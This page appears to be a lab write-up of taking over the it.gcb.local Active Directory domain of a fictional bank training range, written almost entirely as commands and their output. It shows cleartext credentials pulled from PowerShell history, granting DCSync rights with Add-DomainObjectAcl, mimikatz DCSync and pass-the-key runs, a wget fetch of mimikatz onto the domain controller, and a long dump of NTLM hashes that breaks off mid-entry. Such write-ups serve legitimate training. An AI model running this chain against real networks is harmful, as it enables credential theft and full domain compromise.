---
layout: default
---

## it-dc.i.gcb.local 192.168.4.2

the jewels of the crown: IT domain of Global Central Bank company

### 1. Hunt for cleartext credentials

From msp-dc01.msp.local in powershell history for Administrator user we can found: $escrow1
```
[msp-dc01.msp.local]: PS C:\Users\Administrator\Documents> powershell -c Get-Content C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
powershell -c Get-Content C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
$escrow1 = ConvertTo-SecureString "Adm1n!ster" -AsPlainText -ForceGet-HotFix
Get-HotFix
```
From add-dat,gcbacc.local it's possible find : escrow2.txt file
```
PS C:\escrow2> ipconfig; hostname; pwd; cat escrow2.txt
ipconfig; hostname; pwd; cat escrow2.txt

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::6afb:13ee:378a:158c%4
   IPv4 Address. . . . . . . . . . . : 192.168.79.189
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.79.254
acc-data

Path
----
C:\escrow2
theC0mp@ny
```

So, It's possible concat the scrow credetentials escrow1+scrow2
```
Adm1n!stertheC0mp@ny
```


### 2. User authentication as org admin in it.gcb.local domain

After several attempts, it's possible detect that the user who belong the cleartext credentials is:

```
PS C:\tools\tools> Get-ADUser -Identity orgadmin


DistinguishedName : CN=org admin,CN=Users,DC=it,DC=gcb,DC=local
Enabled           : True
GivenName         : org
Name              : org admin
ObjectClass       : user
ObjectGUID        : 70c8d0da-104d-435d-b19e-c28cc2490ae8
SamAccountName    : orgadmin
SID               : S-1-5-21-948911695-1962824894-4291460450-1127
Surname           : admin
UserPrincipalName : orgadmin
```

Authentication in It-Employee15 machine:

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\itemployee15> whoami
it\orgadmin
PS C:\Users\itemployee15> hostname
IT-Employee15
PS C:\Users\itemployee15>

```


### 3. Review Domain ACls

The orgadmin user belong to the following group:
```
Distinguishedname : CN=Organization Admins,CN=Users,DC=it,DC=gcb,DC=local
members           : {CN=org admin,CN=Users,DC=it,DC=gcb,DC=local}
name              : Organization Admins
description       : Organization Admins
```

![WriteDACL permissions in it.gcb.local](/assets/images/WriteDAcl_permissions.png)

Add DCSync Rigths
```
PS C:\Users\itemployee15> Add-DomainObjectAcl -TargetIdentity "DC=it,DC=gcb,DC=local" -PrincipalIdentity IT\orgadmin -Rights DCSync -Verbose
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=IT,DC=GCB,DC=LOCAL
VERBOSE: [Get-DomainObject] Extracted domain 'it.gcb.local' from 'IT\orgadmin'
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=it,DC=gcb,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(samAccountName=orgadmin)))
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=IT,DC=GCB,DC=LOCAL
VERBOSE: [Get-DomainObject] Extracted domain 'it.gcb.local' from 'DC=it,DC=gcb,DC=local'
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=it,DC=gcb,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=DC=it,DC=gcb,DC=local)))
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=org admin,CN=Users,DC=it,DC=gcb,DC=local 'DCSync' on
DC=it,DC=gcb,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=org admin,CN=Users,DC=it,DC=gcb,DC=local rights GUID
'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' on DC=it,DC=gcb,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=org admin,CN=Users,DC=it,DC=gcb,DC=local rights GUID
'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' on DC=it,DC=gcb,DC=local
VERBOSE: [Add-DomainObjectAcl] Granting principal CN=org admin,CN=Users,DC=it,DC=gcb,DC=local rights GUID
'89e95b76-444d-4c62-991a-0facbeda640c' on DC=it,DC=gcb,DC=local
```

### 4. DCsync attack to it.gcb.local

With orgadmin user from It-EMployee15 machine perform DCSync attack:
```
PS C:\Users\itemployee15> C:\tools\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061

mimikatz # lsadump::DCsync /user:IT\Administrator /domain:it.gcb.local
[DC] 'it.gcb.local' will be the domain
[DC] 'it-dc.it.gcb.local' will be the DC server
[DC] 'IT\Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 5/28/2019 3:47:25 AM
Object Security ID   : S-1-5-21-948911695-1962824894-4291460450-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: d69fe53a32594b3461f954da18a41829
    ntlm- 0: d69fe53a32594b3461f954da18a41829
    ntlm- 1: c87a64622a487061ab81e51cc711a34b
    lm  - 0: bbabd825f750d1f65336050075693eab

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 48a1e01bb6d6e7fd7a6b031516d08647

* Primary:Kerberos-Newer-Keys *
    Default Salt : IT.GCB.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : dc36352b88a8f332112d9b6d23bbae2b9a2a0a75188fc0011ee406c829371999
      aes128_hmac       (4096) : c47ef5d828b01c05ad339104bea5ba85
      des_cbc_md5       (4096) : 856e2f1fa1d36ebc
    OldCredentials
      aes256_hmac       (4096) : bbdb52a6e782dbb4e960df121e760018667a029854dd86f7677a16882007ffea
      aes128_hmac       (4096) : 153f4b8ed1b9c0d4370a731cb496553f
      des_cbc_md5       (4096) : 6462297f34ad54ae
    OlderCredentials
      aes256_hmac       (4096) : 6ee5d99e81fd6bdd2908243ef1111736132f4b107822e4eebf23a18ded385e61
      aes128_hmac       (4096) : 6508ee108b9737e83f289d79ea365151
      des_cbc_md5       (4096) : 31435d975783d0d0

* Primary:Kerberos *
    Default Salt : IT.GCB.LOCALAdministrator
    Credentials
      des_cbc_md5       : 856e2f1fa1d36ebc
    OldCredentials
      des_cbc_md5       : 6462297f34ad54ae

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  022de4e09f6abaf89c6258c6dadc9567
    02  086d1b3a3ee63d4fc42e819af7d7f17c
    03  9ba336e786a4959d62184ee60cddf39f
    04  022de4e09f6abaf89c6258c6dadc9567
    05  f3999440113de7bee5ed4739735036f9
    06  f22a5f88437be074be4c4bcc035616de
    07  4abfe538604ef96231cf10617d5eae2b
    08  6df855a4f16912a3b275c4eee5a14404
    09  3673a1204d07e899310d002523674683
    10  96448dce9787a39144a03b33efbfdc21
    11  533a5dd8297e8903ebe5c81159b0048a
    12  6df855a4f16912a3b275c4eee5a14404
    13  c2d795728452932b9ad93e15cdd99b65
    14  197c20003a00f263154dc35ed77e4d48
    15  e8350c128a03bc32eeb2963e48a17e54
    16  a3c69a598f9638eff148cf084cd7aca0
    17  5dd4e0bcd520a55c183aefa056144112
    18  baf427ea3f91fe352eece6a756acc92b
    19  d118603bc8ea535ac6914a0eddebdede
    20  1bc79a53df8200652e8cb611c0ec8f1a
    21  7b6fa5be968e55c3958fc2d597012b39
    22  e2b60c5c90d9ad926136dd6e82cb7620
    23  d7855c57159743238658c86cbbf54b04
    24  00f7bb4b5a5c84464f9f327fa662fc38
    25  7d1dfb9096e9428254de98094c4e5b15
    26  9466b9fff400a1aea2e3d37f8b5d6b83
    27  425135b26cbcab6fd1e5f59ee1da23ee
    28  1d846e22d081534b876fca6bbbeade34
    29  08aca799afce9fc0e9e3650e239dd0cb


mimikatz # lsadump::DCsync /user:IT\krbtgt /domain:it.gcb.local
[DC] 'it.gcb.local' will be the domain
[DC] 'it-dc.it.gcb.local' will be the DC server
[DC] 'IT\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 5/26/2019 1:29:34 AM
Object Security ID   : S-1-5-21-948911695-1962824894-4291460450-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: ae5ef6353b190da04cc7a63b79895e5e
    ntlm- 0: ae5ef6353b190da04cc7a63b79895e5e
    lm  - 0: a3d667af3465808779b7f9e7737f3753

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b2bdedd4bd4a696123c954538aa8d325

* Primary:Kerberos-Newer-Keys *
    Default Salt : IT.GCB.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 62b85ee1e26d8f98f62090a8ac69a258fd32000ac5d3d4691aea2bbba72a226c
      aes128_hmac       (4096) : 8744ae70f355f08ac1cb5256b21421ca
      des_cbc_md5       (4096) : a1c18319fd85a283

* Primary:Kerberos *
    Default Salt : IT.GCB.LOCALkrbtgt
    Credentials
      des_cbc_md5       : a1c18319fd85a283

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  31752cbf2a016cdae8bdf1c235485d33
    02  26340a9486b3579c5d718366cac9c5e4
    03  2998de3699f99d1b05d426592f594311
    04  31752cbf2a016cdae8bdf1c235485d33
    05  26340a9486b3579c5d718366cac9c5e4
    06  8054ae765d906734e147cb6592d87fb3
    07  31752cbf2a016cdae8bdf1c235485d33
    08  9309702e2cfdf98d0e972a1be174f90d
    09  9309702e2cfdf98d0e972a1be174f90d
    10  60597bace8db1eb12ca47894f94a295c
    11  11818387f57e58031ddbe2f6ae8c6bf0
    12  9309702e2cfdf98d0e972a1be174f90d
    13  81ae74cc35647c616afedb858a18825f
    14  11818387f57e58031ddbe2f6ae8c6bf0
    15  6be3516720282c3eda483f525a4886dd
    16  6be3516720282c3eda483f525a4886dd
    17  d2ad57cc28290862d5c4d97ea9aea601
    18  573d370a6125e082012f7a5f5bb1701b
    19  adba4db1519b64532676853f9bb21915
    20  017b7a93546d3beed1f378b9d5bf1d38
    21  76fca3947a80f513a17e4f8280e42154
    22  76fca3947a80f513a17e4f8280e42154
    23  c7108a26cf6508de4599d82050a7fd3a
    24  65874095f943013497753f3b7df6ec1b
    25  65874095f943013497753f3b7df6ec1b
    26  879253728195897911160f6e78ffebaf
    27  8e6b3ee0002c2d06b562ee0bdd0edfdd
    28  98b1a2afc01fef11f0fcf95f9d11317d
    29  60919e56073d2da726d14406cbe411d8


mimikatz #
```

### 5. Impersonate Domain Admin user

Using mimikatz and pth create a new powershell with Domain Administrator user granted ticket:

```
PS C:\Windows\system32> C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::pth /domain:it.gcb.local /user:Administrator /aes256:dc36352b88a8f332112d9b6d23bbae2b9a2a0a75188fc0011ee406c829371999 /run:powershell" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /domain:it.gcb.local /user:Administrator /aes256:dc36352b88a8f332112d9b6d23bbae2b9a2a0a75188fc0011ee406c829371999 /run:powershell
user    : Administrator
domain  : it.gcb.local
program : powershell
impers. : no
AES256  : dc36352b88a8f332112d9b6d23bbae2b9a2a0a75188fc0011ee406c829371999
  |  PID  5876
  |  TID  5384
  |  LSA Process is now R/W
  |  LUID 0 ; 1959939822 (00000000:74d24eee)
  \_ msv1_0   - data copy @ 0000021C7C652F70 : OK !
  \_ kerberos - data copy @ 0000021C7CFADB98
   \_ aes256_hmac       OK
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       -> null
   \_ rc4_hmac_old      -> null
   \_ rc4_md4           -> null
   \_ rc4_hmac_nt_exp   -> null
   \_ rc4_hmac_old_exp  -> null
   \_ *Password replace @ 0000021C7CD4B7A8 (32) -> null

mimikatz(commandline) # exit
Bye!
PS C:\Windows\system32>
```

Validate DA privileges:

```
PS C:\Windows\system32> Import-Module C:\tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess
it-sqlsrv02
IT-Employee11
it-dc
IT-EmployeeTest
it-track01
IT-Employee14
IT-Employee15
IT-Employee16
it-preprod
IT-Employee13
it-appsrv01
IT-Employee17
WARNING: Something went wrong. Check the settings, confirm hostname etc, Connecting to remote server
IT-Employee19.it.gcb.local failed with the following error message : WinRM cannot complete the operation. Verify that
the specified computer name is valid, that the computer is accessible over the network, and that a firewall exception
for the WinRM service is enabled and allows access from this computer. By default, the WinRM firewall exception for
public profiles limits access to remote computers within the same local subnet. For more information, see the
about_Remote_Troubleshooting Help topic.
```

### 6. Access to it.gcb.local domain controller

```
PS C:\Windows\system32> Enter-PSSession -ComputerName it-dc.it.gcb.local
[it-dc.it.gcb.local]: PS C:\Users\Administrator\Documents> whoami;hostname;ipconfig
it\administrator
it-dc

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::1008:769e:534e:ea15%4
   IPv4 Address. . . . . . . . . . . : 192.168.4.2
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.4.254
```



### 7. Disable AV and dump domain hashes

```
[it-dc.it.gcb.local]: PS C:\Users\Administrator\Documents> wget http://192.168.100.15/mimikatz.exe -OutFile mimikatz.exe

[it-dc.it.gcb.local]: PS C:\Users\Administrator\Documents> .\mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "exit
"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::lsa /patch
Domain : IT / S-1-5-21-948911695-1962824894-4291460450

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : d69fe53a32594b3461f954da18a41829

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : ae5ef6353b190da04cc7a63b79895e5e

RID  : 00000455 (1109)
User : appmanager
LM   :
NTLM : 2c5d4678b83e5de26dc0338a0fcf6245

RID  : 00000456 (1110)
User : sqlsvc
LM   :
NTLM : 7782d820e5e5952b20b77a2240a03bbc

RID  : 0000045d (1117)
User : paadmin
LM   :
NTLM : 7584d3bb85cc4d19d430d0353f2690cf

RID  : 0000045e (1118)
User : trackadmin
LM   :
NTLM : 1494b6a6d30e5c747020b979a166501f

RID  : 00000460 (1120)
User : ldapintegration
LM   :
NTLM : eba1b0f28ec756feca1421f4c9572122

RID  : 00000467 (1127)
User : orgadmin
LM   :
NTLM : 425300c7556d771996f21aeffef69ebd

RID  : 00000682 (1666)
User : JillRuffin
LM   :
NTLM : d2e3ba81d76b31c201f245dcf1dabf1d

RID  : 00000683 (1667)
User : JoseBarclay
LM   :
NTLM : 49c338a01ee056ae399efaf070027076

RID  : 00000684 (1668)
User : StaceyValenti
LM   :
NTLM : 4f8397c4a55b39420c15308b147b41f3

RID  : 00000685 (1669)
User : AlexisReuter
LM   :
NTLM : a843e0b2253824338c12da6fdb5faa69

RID  : 00000686 (1670)
User : EricValdez
LM   :
NTLM : 906b044eee8e1d4aebe29ed8279a1ea5

RID  : 00000687 (1671)
User : TheodoreHanna
LM   :
NTLM : 1d9e43da9baac7e7c11503c92bc66df2

RID  : 00000688 (1672)
User : BillyOdom
LM   :
NTLM : 846fe91272e343e4259ef0f2fb5f8c72

RID  : 00000689 (1673)
User : MyrtleTalley
LM   :
NTLM : 4145e701528defa23c87a18ce5975b02

RID  : 0000068a (1674)
User : MalcolmGray
LM   :
NTLM : 976e081a398fc16c49944ab467a3e17b

RID  : 0000068b (1675)
User : JuanWright
LM   :
NTLM : 1ad16894327a04929e637d17260fd888

RID  : 0000068c (1676)
User : AvisMcDonough
LM   :
NTLM : 99a124cdea6c6d1cfd1acee7e2bdc9ac

RID  : 0000068d (1677)
User : TheaMarquez
LM   :
NTLM : fef7b5fb5c296476a460a7000fbd06ca

RID  : 0000068e (1678)
User : WilliamCarter
LM   :
NTLM : c7f637360a42098ff3887221c34fabf7

RID  : 0000068f (1679)
User : BurtonCartwright
LM   :
NTLM : e9da2300776b0e08444f51a18d532166

RID  : 00000690 (1680)
User : MaryDee
LM   :
NTLM : 94fe858d8130a0a916e4d14ffd8c8400

RID  : 00000691 (1681)
User : DorothyTurner
LM   :
NTLM : 4c28385a7f1d118f475487ff0d53e3a8

RID  : 00000692 (1682)
User : ChrisRosen
LM   :
NTLM : 82624de93b79eb74859c3e779fec0644

RID  : 00000693 (1683)
User : StevenAnderson
LM   :
NTLM : f6378c7a2a8f6d314d75f05d640ba886

RID  : 00000694 (1684)
User : JamesJenkins
LM   :
NTLM : d5767cacba01dcf0a2570db7636cad58

RID  : 00000695 (1685)
User : JesseGrabowski
LM   :
NTLM : 8c445180db5355cff0637b3d99fdba0e

RID  : 00000696 (1686)
User : SteveVance
LM   :
NTLM : aac0cab3d58141be1700affd9f78b8e8

RID  : 00000697 (1687)
User : TrishaWebb
LM   :
NTLM : 2f84c08d5d4a322d1ab820b5805a597c

RID  : 00000698 (1688)
User : JamesGillespie
LM   :
NTLM : 303628fd6bc3bb72e5d193ba5ed00245

RID  : 00000699 (1689)
User : JeanWagner
LM   :
NTLM : 909082b67a8177e18aa5f867e579eb6f

RID  : 0000069a (1690)
User : RoySegers
LM   :
NTLM : 704fec04bc829da69724143de811bb85

RID  : 0000069b (1691)
User : EthelHale
LM   :
NTLM : 9129edd3afa68caa9f0891351d02ab4f

RID  : 0000069c (1692)
User : JeniferPurser
LM   :
NTLM : 8ed065782c64cc66cd4ce6b3035796c4

RID  : 0000069d (1693)
User : JohnHughes
LM   :
NTLM : 90f6e7ee2fdf6bdacf2e63a521849410

RID  : 0000069e (1694)
User : TamekaWhitmire
LM   :
NTLM : 35b50b69239434a6bdab553ff71ed1dd

RID  : 0000069f (1695)
User : PatrickHansen
LM   :
NTLM : 44bd7074fb964693e0e9466b4958e711

RID  : 000006a0 (1696)
User : NatashaStoker
LM   :
NTLM : bf368a7616fb9ad08ff989ea01c5f60d

RID  : 000006a1 (1697)
User : HowardHumphrey
LM   :
NTLM : 40758a2677b07838e119edd4eff948b4

RID  : 000006a2 (1698)
User : RandyBergstrom
LM   :
NTLM : f30e3165fd8f3e12c44bb134f0d529c5

RID  : 000006a3 (1699)
User : JeanClimer
LM   :
NTLM : fbdb62afcb20803988e7390bb0f39ea6

RID  : 000006a4 (1700)
User : JamesWall
LM   :
NTLM : 6c899503ea5427cb73a51bf33e780d31

RID  : 000006a5 (1701)
User : BernieWebster
LM   :
NTLM : 092bd6c9a2a8a8e1f9bdbc3effd8bded

RID  : 000006a6 (1702)
User : DesireeChausse
LM   :
NTLM : 9ee4108948959a2e5c3a572b4930d3e8

RID  : 000006a7 (1703)
User : JimmyKelty
LM   :
NTLM : 47c1640c42ba4331cac0ee455cd16c1c

RID  : 000006a8 (1704)
User : GaryGonzalez
LM   :
NTLM : 3adfb9eded503a13b8fc56881d4d8bfa

RID  : 000006a9 (1705)
User : KristinWatson
LM   :
NTLM : c724483a92c89180560d827294f2f670

RID  : 000006aa (1706)
User : JeffreyHurd
LM   :
NTLM : 66e51eae78553603a7eac904455147a3

RID  : 000006ab (1707)
User : KimberyLogan
LM   :
NTLM : c30f2e5ed66ff8de80cd9c3b21727ac2

RID  : 000006ac (1708)
User : HomerMunn
LM   :
NTLM : ff5d32eba76acd8d21a2a624b0663a2a

RID  : 000006ad (1709)
User : StephanyIngram
LM   :
NTLM : a9a74eb2dd82d26f8c49feb92bc1501e

RID  : 000006ae (1710)
User : DanielWelcome
LM   :
NTLM : 07e9dbfec9352a323449b97312523e32

RID  : 000006af (1711)
User : MorrisWright
LM   :
NTLM : af5e52f1af0df783361bead6092cfa0c

RID  : 000006b0 (1712)
User : DarrellStates
LM   :
NTLM : 51efdbccff05df9b2b598e221350a4c1

RID  : 000006b1 (1713)
User : WillieLarosa
LM   :
NTLM : a7b92c8f40408aa3727333b0f47ed2f2

RID  : 000006b2 (1714)
User : SteveHamilton
LM   :
NTLM : 12b0900f38ec03e30d52365a3e269547

RID  : 000006b3 (1715)
User : RobertLett
LM   :
NTLM : c62a070a735fc7822e27cb8ddaa33f19

RID  : 000006b4 (1716)
User : JohnTheriot
LM   :
NTLM : d4040f0697c84172be81dd545db85478

RID  : 000006b5 (1717)
User : AnnMerritt
LM   :
NTLM : 9460f1b575baf5c7aa38c8e413706409

RID  : 000006b6 (1718)
User : BettyCreason
LM   :
NTLM : 181b328623a410dd76c252ac33a3399d

RID  : 000006b7 (1719)
User : TonyLambert
LM   :
NTLM : a085f8ba2510de5b72d901a5da5c8081

RID  : 000006b8 (1720)
User : RichardGonzalez
LM   :
NTLM : ac5d15d4fdbeabf2b3b5eb91aeb8c497

RID  : 000006b9 (1721)
User : EvaReyna
LM   :
NTLM : e2adae6cff9069eb7fef6f2e77094c0f

RID  : 000006ba (1722)
User : BrandyBecker
LM   :
NTLM : e8664c6bae8e15a8e460c00a4afa4f5f

RID  : 000006bb (1723)
User : MarshaGoodwin
LM   :
NTLM : d6d7cbfc5fb65aec7147bc771a449ccc

RID  : 000006bc (1724)
User : JuliusBrown
LM   :
NTLM : 0487ccccc4e6c9f15ab6d9410c6f36a6

RID  : 000006bd (1725)
User : RobertGraham
LM   :
NTLM : 302539a02538b7dc2d411ed1b86422a3

RID  : 000006be (1726)
User : SusanWard
LM   :
NTLM : 9b8a3218a5d7203f27009e9850c341da

RID  : 000006bf (1727)
User : KevinMcGhee
LM   :
NTLM : 7b2041b72c9dcfc57472dcff61bb14fe

RID  : 000006c0 (1728)
User : JohnBrown
LM   :
NTLM : a420bd67354a4e72672fe77ff9a99ed4

RID  : 000006c1 (1729)
User : FrancesBradley
LM   :
NTLM : ec8ca6cd0985c8d31fa07a25c8d0ffcc

RID  : 000006c2 (1730)
User : GinaHarris
LM   :
NTLM : 8fcd2f6c9b48fbc8ea1b0337170e18e2

RID  : 000006c3 (1731)
User : JoseAcuna
LM   :
NTLM : fba269c8c8ee220fb987ebc9eb7676b4

RID  : 000006c4 (1732)
User : AmyDunn
LM   :
NTLM : 919399f7a4344cca948de32c1ce5d372

RID  : 000006c5 (1733)
User : JillHicks
LM   :
NTLM : c7e0dd487c8af5325d43554add3fe485

RID  : 000006c6 (1734)
User : DebbieConn
LM   :
NTLM : 3b8fc114e18ee16c3bebbb443efde6dd

RID  : 000006c7 (1735)
User : TerryMarr
LM   :
NTLM : bcb543a6c60d293fbd1d6cbbd9ec72e5

RID  : 000006c8 (1736)
User : DorrisArrington
LM   :
NTLM : c25e9ec1c61dd4f8ec5e72b0dc1f12c8

RID  : 000006c9 (1737)
User : CandiceLadner
LM   :
NTLM : cc1f24b3c6e057b3214535344a876c6d

RID  : 000006ca (1738)
User : HeatherShade
LM   :
NTLM : 046b3208ee4b69d08277d114ec5eb244

RID  : 000006cb (1739)
User : MichealParker
LM   :
NTLM : 36d9e2740336e1b437520c291e291a97

RID  : 000006cc (1740)
User : JosephRoberson
LM   :
NTLM : 6cef38f45649f6bc884b7a11244efd8f

RID  : 000006cd (1741)
User : JosephScott
LM   :
NTLM : ca9c6c49922bbbaf1738e761e42fc2eb

RID  : 000006ce (1742)
User : ShariceAnderson
LM   :
NTLM : f8422b397e4db7f5b1d218b94102bdb6

RID  : 000006cf (1743)
User : DawnBaize
LM   :
NTLM : d9cd2047f1369298d380d046073097e9

RID  : 000006d0 (1744)
User : CarolineGriggs
LM   :
NTLM : ca0abb7f09277ac249b1ecd2e2ff490f

RID  : 000006d1 (1745)
User : NatalieFuller
LM   :
NTLM : e21e171c08d99f828871edabed80af7b

RID  : 000006d2 (1746)
User : MistyScholl
LM   :
NTLM : b33f086d9cfea25fcf18bdeff9cf5671

RID  : 000006d3 (1747)
User : MichaelPeres
LM   :
NTLM : e4e024ab6da93132c831fb606a3a947d

RID  : 000006d4 (1748)
User : DarrylBrown
LM   :
NTLM : 3137239bf6f8a72001ff7af09611f22a

RID  : 000006d5 (1749)
User : JamesKyzer
LM   :
NTLM : 9ac25fcc4975237f79d6de4601325624

RID  : 000006d6 (1750)
User : JamesDamico
LM   :
NTLM : dc03c8a6255f0a934070ba5a7b288b26

RID  : 000006d7 (1751)
User : CraigRolon
LM   :
NTLM : 030f70d1de139c14251fd233319b5635

RID  : 000006d8 (1752)
User : JulieOutlaw
LM   :
NTLM : 9566cea7059434c77cbd1ce9b4ace4d7

RID  : 000006d9 (1753)
User : JenniferScott
LM   :
NTLM : ba27e9a3c7ef4c80f93b16539d73bad3

RID  : 000006da (1754)
User : MarionTribble
LM   :
NTLM : 85c9de0392ab93d7eeecbc94f0a447dd

RID  : 000006db (1755)
User : AnnDaniels
LM   :
NTLM : 6182a8bbfa655177557df261f89c4971

RID  : 000006dc (1756)
User : EmmaShoemaker
LM   :
NTLM : 440595661fdd4685116108ccc1c0e8b8

RID  : 000006dd (1757)
User : FayeMatthews
LM   :
NTLM : 4d1945a6458f863affc7decd310abc7d

RID  : 000006de (1758)
User : ChristinaBowman
LM   :
NTLM : 29b349fe89fd21d8c9e268486fb1fbde

RID  : 000006df (1759)
User : DeanaCyr
LM   :
NTLM : 81b313844a24c02da018d979d7c4ef21

RID  : 000006e0 (1760)
User : ThomasWatters
LM   :
NTLM : 6b11922b4618d47ea1ec47d93acf120d

RID  : 000006e1 (1761)
User : JackPotter
LM   :
NTLM : 8c2e94a72ddc12dae31f9f22640e54e9

RID  : 000006e2 (1762)
User : CandiceFoster
LM   :
NTLM : bd41c90e117b602e843b5a09ea3fc21b

RID  : 000006e3 (1763)
User : TimothyBarber
LM   :
NTLM : 7e8801ef4e72f9b1e1224f434a6a10be

RID  : 000006e4 (1764)
User : RobinPriddy
LM   :
NTLM : d8d2c0976c1499ea043dc91545382e90

RID  : 000006e5 (1765)
User : DonnaHouse
LM   :
NTLM : c00bdebeefdaa1fd8d273a18b570d8b6

RID  : 000006e6 (1766)
User : JuliaCameron
LM   :
NTLM : 2931339aab46ea22ddf1e006973bf60e

RID  : 000006e7 (1767)
User : CarrieNicholson
LM   :
NTLM : 79422a33ae94b18eb5f0e5b7eb1be02e

RID  : 000006e8 (1768)
User : ReneHurtado
LM   :
NTLM : 1ebccc2faec9f1a84c8df65d5a456147

RID  : 000006e9 (1769)
User : KurtRoss
LM   :
NTLM : 81e6b867a67d5342882c6a5e909beb95

RID  : 000006ea (1770)
User : CarolynGuy
LM   :
NTLM : e5f69d2dc11b2c1b3ff7fd966c27116e

RID  : 000006eb (1771)
User : JulieGonzalez
LM   :
NTLM : e9a97a2bd044f0393bb5857bd55c4d7b

RID  : 000006ec (1772)
User : WilliamWalls
LM   :
NTLM : 7034283d2db2661bd40fe5a9c0998e50

RID  : 000006ed (1773)
User : BryanBlock
LM   :
NTLM : bf0de1a669705fc5e882a76ebd1e5c3b

RID  : 000006ee (1774)
User : PatriciaHausman
LM   :
NTLM : 27b86a941abaf17350571a9df596517a

RID  : 000006ef (1775)
User : JefferyNash
LM   :
NTLM : 21fb2a6a55fc5de90900f15e41ce0a67

RID  : 000006f0 (1776)
User : MirthaLopez
LM   :
NTLM : e4f3cfbc592897788bf7ca60fbb3f785

RID  : 000006f1 (1777)
User : EricBerner
LM   :
NTLM : a473da7c0522e18ec66596a7a67fccd2

RID  : 000006f2 (1778)
User : ThomasBlakeney
LM   :
NTLM : 3778cd65c034c0efa8fa46781a592d74

RID  : 000006f3 (1779)
User : JefferyCraven
LM   :
NTLM : 5e93a0da16767484c6da795b3884fb32

RID  : 000006f4 (1780)
User : ScottGatlin
LM   :
NTLM : d60a6ef36d1d258291ccf06946fb37ed

RID  : 000006f5 (1781)
User : ConstanceHills
LM   :
NTLM : 1df785e4ca7409919d3a3899d2e569ed

RID  : 000006f6 (1782)
User : TracyFerrell
LM   :
NTLM : 952fe276c1a574b9e88f51d0f3dcda34

RID  : 000006f7 (1783)
User : NatashaCrowder
LM   :
NTLM : d81fd047bf727df19316a1f0a9e632a1

RID  : 000006f8 (1784)
User : LeoMurrah
LM   :
NTLM : cb9c363a834ead3f4379d7b35be10dea

RID  : 000006f9 (1785)
User : BrandonMorgan
